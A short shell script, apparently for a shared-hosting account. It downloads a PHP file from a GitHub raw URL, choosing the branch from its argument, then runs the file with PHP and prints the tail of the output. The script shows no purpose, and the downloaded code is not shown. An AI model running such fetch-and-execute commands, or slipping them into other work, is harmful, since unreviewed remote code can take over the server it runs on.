#!/bin/sh
cd /home/u791571885 && curl -fsSL -o t150.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs150.php" && /opt/alt/php83/usr/bin/php t150.php 2>&1 | tail -c 6000
